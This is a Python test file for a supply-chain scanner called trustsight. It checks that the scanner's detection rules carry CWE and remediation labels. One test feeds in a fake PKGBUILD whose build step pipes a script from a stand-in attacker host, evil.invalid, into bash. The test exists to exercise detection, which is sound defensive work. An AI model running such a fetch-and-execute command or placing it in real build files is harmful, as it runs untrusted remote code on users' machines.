"""CWE and remediation labels: present for every rule, never scored."""

from __future__ import annotations


def test_every_rule_resolves_a_cwe_and_remediation():
    from trustsight.categories import RULE_CATEGORIES
    from trustsight.rule_metadata import cwe_of, remediation_of

    missing = [
        rule_id for rule_id in RULE_CATEGORIES
        if not cwe_of(rule_id) or not remediation_of(rule_id)
    ]
    assert missing == []


def test_report_findings_carry_the_descriptive_labels():
    from trustsight.analysis import scan_diff
    from trustsight.config import load_config, load_rules
    from trustsight.reporting import finding_rows

    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -0,0 +1,4 @@\n"
        "+pkgname=demo\n+pkgver=1\n"
        "+build() {\n+  curl -fsSL https://evil.invalid/x.sh | bash\n+}\n"
    )
    fact = scan_diff(
        diff, rules=load_rules(), config=load_config(), package_name="demo")
    rows = finding_rows(fact)
    assert rows
    for row in rows:
        if row["rule_id"] in ("COVERAGE", "NOVELTY", "SOURCE_BUCKET"):
            continue
        assert row["cwe"], row["rule_id"]
        assert row["remediation"], row["rule_id"]
